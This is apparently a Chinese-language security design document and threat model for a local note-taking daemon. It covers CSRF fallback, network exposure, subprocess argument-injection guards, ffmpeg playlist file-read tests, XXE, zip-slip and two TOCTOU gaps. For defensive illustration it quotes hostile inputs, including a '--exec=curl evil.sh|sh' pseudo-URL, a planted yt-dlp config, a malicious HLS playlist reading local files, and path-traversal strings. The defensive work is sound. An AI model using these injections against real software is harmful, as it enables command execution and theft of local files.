#### CSRF 同源兜底（`OPENMEMO_AUTH=token` 档下**也**生效）

> 📝 **此前本文档全文一字未提这条兜底**（`grep "same-origin\|兜底\|Sec-Fetch"` 只命中三处无关内容）。
> 而本文件头引的立论原话是「**风险被记录下来才叫接受风险，没记录就是忽略风险**」——
> 这是一条**刻意接受**的风险（`auth.ts` 注释明写「同源兜底是**显式裁决，不是遗漏**（ADR，勿当 bug 修掉）」），
> 漏记等于本文档在自己的核心规矩上自我违反。现补记如下。

**位置**：`apps/daemon/src/http/auth.ts:225-288`（`checkCsrfDetailed()`），放行点在 `:287`
（`return { ok: true, via: 'same-origin-fallback' }`）。类型分支声明在 `:219-220`。

**它做什么**：写请求（POST/PUT/PATCH/DELETE）**没带 CSRF 头**时，只要同时满足下面两条就放行：

1. `Sec-Fetch-Site` **不是** `cross-site`/`same-site`——注意：**该头缺失（`undefined`）也算通过**，
   因为非浏览器客户端（curl / 脚本）根本不发这个头；
2. `Origin` 可解析，且 `Origin.host` 与 `Host` 头**严格相等**（小写比较，含端口）。

**它不做什么（三条边界，来自 `auth.ts:242-245`，别削掉）**：

- **带了 CSRF 头就仍然严格校验**——有兜底不等于不看，带错的一律拒（`auth.ts:257-263`）；
- 兜底路径要让调用方记一条 **info** 日志；若它成了常态，说明前端 `sessionStorage` 那个根因没修好；
- **token 鉴权完全不动**——它才是真正的访问控制。

**裁决理由（`auth.ts:227-234` 原话摘要）**：前端在 `sessionStorage` 不可用时会丢掉 CSRF 头，
于是「读全部 200、写全部 403」——用户填完 API Key 点保存，界面毫无异常，库里一行没有。
而这一层挡不住真正的威胁：**能伪造同源 `Origin` 的攻击者，本来就能直接读 SQLite 文件**。

**⚠️ 由此产生的一条必须写明的后果**：
下面「恢复方式（一个变量）」里的 `OPENMEMO_AUTH=token`，**恢复的是「token 鉴权 + 打了折的 CSRF」，
不是原始形态**。恶意网页会被 `Sec-Fetch-Site: cross-site` 挡住，但**任何能自设 `Origin` 与 `Host` 头的
非浏览器客户端**（能路由到该 `IP:端口` 的任何人）在 token 档下仍可绕过 CSRF 这一层，
只剩 token 本身作为防线。照那一行做联网加固的人，会得到一个**比他以为的弱**的姿态。

#### 风险（如实陈述，不加修饰）

在 `0.0.0.0` + 鉴权关闭的组合下：
**任何能路由到该 `IP:端口` 的人，都可以读取全部笔记、转写稿与音频，并可修改或删除它们。**
数据目录中还包含 `secrets.json`（用户的第三方 API Key，明文 0600）——
接口不回显明文，但可被删除或覆盖。

⚠️ 用户在做这个决定时，其表述前提是「反正也是本地运行的东西」。
**这个前提在当前部署下并不成立**：进程绑的是 `0.0.0.0`，外部 IP 经 NAT 可达。
此事实已回报，由用户自行判断是否维持该配置。**本文档不代替他做这个判断，也不粉饰它。**

#### 恢复方式（一个变量）

```bash
OPENMEMO_AUTH=token   # 恢复 token 鉴权与 CSRF（CSRF 只恢复到"带同源兜底"的形态，见上一小节）
OPENMEMO_HOST=127.0.0.1   # 恢复只绑回环
```

> ⚠️ **此前这一小节写着「恢复方式（一个变量）」并暗示 `OPENMEMO_AUTH=token` 能完整恢复原防护。**
> 订正：token 鉴权确实完整恢复，但 CSRF 恢复的是**打了折的**形态 —— 见上面「CSRF 同源兜底」一节。

更推荐的组合：绑回环 + SSH 端口转发 —— 那样「本地运行」是真的，关掉鉴权也没有暴露面。

#### 若日后改为多用户或公网部署，**必须**先做完这些

1. **恢复鉴权**，并改为**每用户独立凭据**（当前是全局单一 token，无法区分调用者）
2. **加传输层加密**（TLS 已实现但默认关闭；公网上明文传输笔记内容不可接受）
3. **补 §3 的两个已知缺口**（SSRF 的 TOCTOU 重解析、以及本机进程可信假设）
4. **重新评估「本机其它进程被视为可信」** —— 它是上面所有取舍的地基，多用户下直接失效
5. **加访问审计**（当前无任何访问日志，出事后无法追溯谁读了什么）

### 我们防的是什么

1. **用户粘贴的恶意 URL / 文件名 / 字幕内容** —— 主要攻击面，用户可能被钓鱼、可能导入他人分享的链接
2. **恶意/被攻陷的远端服务器** —— 返回恶意媒体文件、恶意 RSS feed、恶意 HLS 播放列表
3. **恶意网页**（用户在另一个标签页打开）试图打我们的本地 API（CSRF / DNS rebinding）
4. **SSRF**：把我们的下载器当作跳板去访问用户内网、云元数据端点、或**我们自己的 daemon**

### 我们**不**防的是什么（明确的非目标）

- 本机上已经在运行的恶意进程（它已经能读用户全部文件了，我们防不住也没意义）
- 物理接触攻击者
- 恶意的模型权重文件（我们校验 SHA256 防篡改，但不做模型内容审计）
- 供应链攻击（依赖 lockfile + CI 许可证白名单，但不做深度审计）

## 1. 子进程参数注入防护（7 层）

**这是本项目最高风险点**：用户粘贴的 URL 会进入 `yt-dlp` / `ffmpeg` 的命令行。

实现：`packages/pipeline/src/subprocess/{argGuard,runner}.ts`
测试：`packages/pipeline/src/subprocess/__tests__/argGuard.test.ts`（**38 个攻击用例 / 9 个 `describe`，全绿**）

> 📝 **此前写着「25 个攻击用例」** —— 那是 ADR-008 时点的数字。之后 T-143 补了 win32 路径族 6 条
> （`argGuard.test.ts:285-334`）、T-145 补了 symlink 根族 6 条（`:394-441`），实测 `it(` 计数为 **38**。

### 关键认识：`shell: false` 挡不住参数注入

这是最容易被误解的一点。不经过 shell 消灭了 `; rm -rf /`、`$(...)`、反引号、管道这一整类攻击，
**但 argv 里一个以 `-` 开头的元素，仍然会被目标程序当成选项解析**。

用户完全可以把 `--exec=curl evil.sh|sh` 当作"URL"粘贴进来。没有 shell 参与，但 yt-dlp 会老老实实
把它当成 `--exec` 选项执行。

要么就把 L1 如实降级为「约定」——本文已按后者措辞。**在加上机器执行者之前，不要再把 L1 当作防线计入。**

### L2 的 Windows 细节（CVE-2024-27980）

Node 在 Windows 上执行 `.bat`/`.cmd` **必须**经过 `cmd.exe`，这会重新引入 shell 元字符解析 ——
这正是 CVE-2024-27980 的成因。既然整个设计建立在 `shell: false` 上，唯一能保住这个承诺的办法
就是**拒绝执行任何需要 shell 的东西**。只允许 `.exe`。

> ⚠️ **实测教训**：这条检查最初**用宿主的 `path.isAbsolute` 判断 Windows 路径**，在 Linux 上
> `isAbsolute('C:\\tools\\x.exe')` 返回 false，导致 Windows 路径一律先被判成穿越，
> **CVE 分支根本不可达 —— 而 `.bat` 的测试一直在"通过"，只是通过的理由是错的**。
> 已修（按目标平台选 `win32.isAbsolute` / `posix.isAbsolute`）。
> 教训写进 ADR-008：**断言拒绝的"错误码"，而不只是断言"被拒绝了"。**

### L3 的三个易错点（都已有对应测试）

1. **控制字符必须在 `new URL()` 之前检查。** `new URL()` 会**静默剥离** `\n`、`\t`、`\r`。
   先 parse 再查，等于把恶意串洗成看起来干净的串。
2. **长度必须按字节算。** `'😀'.repeat(1000)` 是 1000 字符但 **4000 字节**。按 `.length` 判会放行 4KB argv。
3. **我们自己就是 SSRF 的靶子。** daemon 监听本机（**当前默认 `0.0.0.0`**，见 §0），所以
   "让下载器访问 `http://127.0.0.1:<port>/api/v1/settings`" 是针对我们自己 API 的
   confused-deputy 攻击。私网地址过滤里**必须包含回环**。
   （📝 **此前这句写着「daemon 绑在 `127.0.0.1`」** —— 论证本身仍然成立，但**前提句已过期**：
   实际默认绑 `0.0.0.0`，而绑 `0.0.0.0` 只会让这条更重要，不会让它失效。）

### L4 的实测验证（不是声称，是真跑过）

`--ignore-config` 是这一层最重要、也最容易被遗漏的一条：**攻击者只要能写一个 `yt-dlp.conf`，
就能注入 `--exec` 拿到任意命令执行。**

实测（T-025）：

```
planted /root/.config/yt-dlp/config  ->  --exec "touch /tmp/e2e/PWNED"
run YtDlpSource.probe(...)
result: PWNED file created? -> NO ✅ --ignore-config held
```

**这条防护经过真实攻击验证，不是纸面配置。**

## 2. 其它已实施的防护

### 2.1 路径与文件名（D-01 §8.5）

**根本策略：用户永远不提供文件名。** 所有落盘文件名由我们生成，用户提供的标题只存在 DB 的
展示字段里。这从根上消灭了 `../../../.ssh/authorized_keys`、Windows 保留名（`CON`/`PRN`/`COM1`）、
NTFS ADS（`file.txt:evil`）、Unicode 同形字、尾随空格/点等一整族问题。

必须接受路径的少数入口（"从磁盘导入"）走 `assertWithinRoot`：
**先 `realpath` 再比较** —— 只做 `path.resolve` 的词法比较会被 symlink 骗过（有对应测试）。

### 2.2 媒体协议白名单 —— 已用真实攻击验证（T-026）

ffmpeg 不只是转码器，它是一个**协议客户端**，认识 `concat:`、`subfile:`、`file:` 等。
一个精心构造的 HLS 播放列表可以让它**读取本地任意文件并拼进输出**。

**这不是理论风险，实测确认过。** 构造了引用 `file:///tmp/attack/secret.ts` 的恶意播放列表：

```
对照组（允许 file 协议）：
  [in#0] Opening 'file:///tmp/attack/secret.ts' for reading      ← 攻击成立，真的读了本地文件

我们的白名单：
  [file @ …] Protocol 'file' not on whitelist 'http,https,tls,tcp,crypto,httpproxy'!
```

三种变体（`file:` / `concat:` / `subfile:`）全部被挡。

> ⚠️ **测试方法论教训**：第一次用 `.txt` 金丝雀，攻击"失败"了——但挡住它的是 ffmpeg 8.x 自己的
> `allowed_segment_extensions`，**不是我们的白名单**。换成 `.ts` 扩展名才隔离出真正起作用的层。
> 与 ADR-008 记录的"假绿灯"同源：**必须确认"挡住了"是被哪一层挡住的。**

#### ⚠️ 由此查出并修复的一个真实漏洞（本地播放列表导入）

远程路径安全，**本地路径当时不安全**。`LocalFileSource` 的扩展名白名单包含 `.m3u8`，
而本地分支必须传 `-protocol_whitelist file`（否则普通本地媒体解不了）。实测：

```
$ ffmpeg -protocol_whitelist file -i /tmp/attack/local_evil.m3u8 …
[in#0] Opening 'file:///tmp/attack/secret.ts' for reading      ← 越过了受管根目录
```

**协议白名单在这里救不了我们** —— 播放列表是通过一个我们**故意启用**的协议读本地文件，
直接绕过 `assertWithinRoot` 的保证。攻击路径：用户下载/收到恶意 `.m3u8`，当作本地媒体导入。

**已修复**：① 本地导入拒绝一切播放列表扩展名（`.m3u8 .m3u .pls .xspf .asx .wpl`）；
② 双保险——`ffprobe` 的 `format_name` 命中 `hls|applehttp|m3u` 也拒绝（防改名绕过）；
③ `match()` 对播放列表返回 0。**远程 HLS 不受影响**（白名单里没有 `file`，已验证能挡住同一攻击）。

- 处理本地文件：`-protocol_whitelist file`
- 处理远程/HLS：`-protocol_whitelist https,tls,tcp,crypto,httpproxy` —— **不含 `file`**

另外：**用户可控字符串绝不进 `-filter_complex` / `-vf` / `-metadata`**。
filter 语法有自己的转义规则（`:` `,` `[` `]` `'` `\`），是嵌在单个 argv 元素**内部**的第二套注入语法。

### 2.3 RSS / XML

`RssSource` 用小型标签扫描器而非通用 XML 解析器。理由：我们只需要四个字段，而 XML 解析器是
经典的 XXE 载体。**我们不实现实体展开、不取 DTD、不跟随外部引用**，并且**携带 `<!DOCTYPE>` 或
`<!ENTITY>` 的 feed 直接拒绝**。

feed 里的每个 enclosure URL **都要重新过一遍 `validateHttpUrl`** —— 恶意 feed 只是提供
`file:///etc/passwd` 的另一种方式。

### 2.4 解压（GPU 后端包）

实现：`packages/downloader/src/unpack.ts`（742 行）；独立验证脚本
`packages/downloader/scripts/verify-unpack.mjs`（**53/53**，见 ADR-015:44）。

- **Zip-Slip / 绝对路径 / `..` 段**：一律拒绝。绝对路径覆盖 POSIX `/`、Windows `C:\` 与 UNC `\\`
  三种写法（`unpack.ts:131-143`）；`..` 段单独拒（`:148-149`）；resolve 之后**再做一次前缀比对**
  作为纵深防御（`:165`）。
- **链接条目（symlink/hardlink）：按目标判定，不是一律拒绝。**
  绝对目标 → 拒；解析后逃出 `destRoot` → 拒；落在根内 → 放行（`unpack.ts:169-208`）。
  > 📝 **此前这一节写着「symlink/hardlink 条目…一律拒绝」。** 订正原因写在 `unpack.ts:169-183` 的注释里：
  > 「Rejecting EVERY symlink is too blunt and breaks real software」——**官方 whisper.cpp tarball
  > 自带 `libwhisper.so -> libwhisper.so.1.7.6`，一律拒绝会让我们自己的 ASR 后端装不上。**
  > ⚠️ 附带一条代码侧的债（不在本次文档订正范围，但值得同批修）：`unpack.ts:16-19` 的文件头注释
  > **自己也还写着 "never created / Rejected outright"**，与 `:169-183` 的实现打架。
- **资源上限**：条目数上限 `maxEntries`（默认 20000，`:60-61, 96, 104-107`）、未压缩总字节上限
  （默认 4 GiB，`:58-59, 119`）、`zlib.maxOutputLength` 解压中途中止（`:401`）、
  xz 解压中途字节天花板（`:652-657`）——防 zip bomb。
- **解压前先校验整包 SHA256**（`packages/downloader/src/verify.ts` + `install()` 路径；
  ADR-004 决策 5 —— Ollama 的下载器没做校验，我们必须补上）。

### 2.5 崩溃隔离

所有原生工具走**子进程**（ADR-003 决策 1）。这不只是架构洁癖：T-012 实测发现，
whisper.cpp 在后端库缺失时会调 `ggml_abort()` 直接 SIGABRT 退出（exit 134），
**进程内 N-API 绑定会把整个 daemon 一起打死**。

### 缺口 1：DNS Rebinding（TOCTOU）

| 项                        | 内容                                                                                                                                                                                                                                                                                                                                     |
| ------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **位置**                  | `packages/pipeline/src/subprocess/argGuard.ts` → `assertHostNotPrivate()`                                                                                                                                                                                                                                                                |
| **性质**                  | Time-of-check to time-of-use（检查与使用之间的时间窗口）                                                                                                                                                                                                                                                                                 |
| **具体机制**              | `assertHostNotPrivate()` 用 `dns.lookup()` 解析主机名，确认解析结果不是私网地址。但**真正发起连接时会再解析一次**。控制 DNS 的攻击者可以让第一次解析返回公网 IP（通过检查），第二次返回 `127.0.0.1` 或 `169.254.169.254`（实际连接）。                                                                                                   |
| **触发前提**              | ① 攻击者控制一个域名的权威 DNS；② **用户被诱导粘贴该域名的 URL**；③ 攻击者能设置极短 TTL 并在两次解析之间切换应答                                                                                                                                                                                                                        |
| **可造成的影响**          | 让 daemon 向本机其它服务或云元数据端点发起 HTTP GET，并把响应体当作"媒体文件"下载到临时目录。**注意**：daemon 不会把该内容回显给网页（它会先过 ffprobe，非媒体文件会被拒绝并删除），因此这是一个**盲 SSRF**，攻击者拿不到响应内容。                                                                                                      |
| **为何判定当前可接受**    | ① 需要用户主动粘贴攻击者的 URL（社工前提）；② 是盲 SSRF，无回显；③ 本产品是个人自用，本机通常没有其它敏感的 localhost 服务；④ 云元数据端点场景不适用（不部署在云上）；⑤ 字面 IP 的私网过滤**已经生效**，只有主机名路径存在此窗口                                                                                                         |
| **🚨 必须立即修复的条件** | **只要满足下列任意一条**：<br>① 改为**多用户**部署；<br>② daemon 监听地址改为非 `127.0.0.1`（任何形式的联网部署）；<br>③ 部署到**云主机**（元数据端点 `169.254.169.254` 会立刻变成真实高危目标）；<br>④ 增加任何会把下载内容**回显给调用方**的功能（盲 SSRF 变成有回显 SSRF）；<br>⑤ 本机开始运行其它 localhost 服务（如数据库管理面板） |
| **修复方案**              | 把解析得到的 IP **钉进连接**：用自定义 `lookup` hook（`undici.Agent({connect:{lookup}})` 或 `http.request({lookup})`）强制连接到校验时那个 IP，而不是重新解析。必须同时处理重定向（每一跳都要重新校验）。                                                                                                                                |

### 缺口 2：文件路径 TOCTOU

| 项                        | 内容                                                                                                                                                                                                                            |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **位置**                  | `packages/pipeline/src/subprocess/argGuard.ts` → `assertWithinRoot()`，以及其调用方 `media/sources/localFile.ts`                                                                                                                |
| **性质**                  | Time-of-check to time-of-use                                                                                                                                                                                                    |
| **具体机制**              | `assertWithinRoot()` 用 `realpath` 解析路径并确认它在受管根目录内，然后把**路径字符串**交给下游（ffprobe / ffmpeg）。在"校验通过"和"下游 open()"之间，攻击者可以把路径中的某一段替换成指向根目录外的 symlink。                  |
| **触发前提**              | **本机已经存在一个恶意进程**，且它对相关目录有写权限，且能精确抢到那个时间窗口                                                                                                                                                  |
| **可造成的影响**          | 让 ffprobe/ffmpeg 读取受管根目录之外的文件。由于输出只是转写文本，理论上可以把某个文本文件的内容"转写"出来——但实际上 ffprobe 会因为不是媒体文件而拒绝。                                                                         |
| **为何判定当前可接受**    | **触发前提本身就已经越过了我们的威胁模型**（§0：本机其它进程视为可信）。一个已经能在用户目录里创建 symlink 的进程，本来就能直接读取用户的全部文件，无需绕道我们的转写功能。**修这个缺口不会提高实际安全性。**                   |
| **🚨 必须立即修复的条件** | ① 改为**多用户**部署（此时"本机其它进程"可能属于**别的用户**，前提不再成立）；<br>② daemon 以**更高权限**（root / 服务账户）运行 —— 那时它能读的文件比调用者多，缺口就有了实际价值；<br>③ 引入沙箱/多租户隔离后仍保留此代码路径 |
| **修复方案**              | D-01 §8.5 步骤 5 已给出：校验通过后**立即 `open()` 拿到 fd**，之后所有操作用 fd（`fstat` 复核 inode 与大小），不再用路径字符串。需要下游工具支持 `/dev/fd/N`（Linux/macOS 可行，Windows 需另想办法）。                          |

### 3.1 两个缺口的共同点

两者都是 **TOCTOU**，都**无法靠"再检查一次"修复** —— 再检查只是把窗口变小，不会消除。
真正的修复都是**把校验结果固化成句柄**（IP 固化成连接、路径固化成 fd），而不是重复校验字符串。

### 4.1 为何暂不支持"用浏览器 cookie 下载会员/登录内容"

memo.ac 有这个能力，我们**明确暂不实现**（Manager 已列入给用户的决策清单）。原因不是工作量：

**`--cookies <path>` 是一个任意文件读取入口。** 该参数让 yt-dlp 打开我们指定的任意路径并解析。
一旦这个路径变得用户可控（"选择你的 cookie 文件"就是这个意思），攻击面就从"用户粘贴的 URL"
扩大到"用户被诱导选择的任意本地文件"，而 yt-dlp 会把读到的内容用于网络请求。
`--cookies-from-browser` 更进一步：它会**直接读取浏览器的 cookie 数据库**，也就是用户
**全部网站的登录凭据**，然后交给一个我们不控制的、按站点执行大量解析逻辑的大型程序。

配套问题同样真实：

- cookie 一旦落到我们的临时目录，就成了**磁盘上的明文凭据**，需要独立的生命周期与清理策略；
- 出错日志里极易泄漏 cookie 值（我们的 stderr 会进 job 日志）；
- 用户很难判断"授予某个笔记软件读取全部浏览器 cookie"的后果。

**结论**：这不是一个"补代码"的功能，而是一个**需要先做安全设计的功能**——至少需要：
凭据不落盘（或加密落盘 + 明确 TTL）、日志脱敏、最小化到单站点、以及清楚的用户告知。
在这些设计做完之前，`YtDlpSource` **从不传** `--cookies` / `--cookies-from-browser`
（见 §1 L4 的"绝不传"清单），会员内容一律走"用户自行下载后本地导入"。
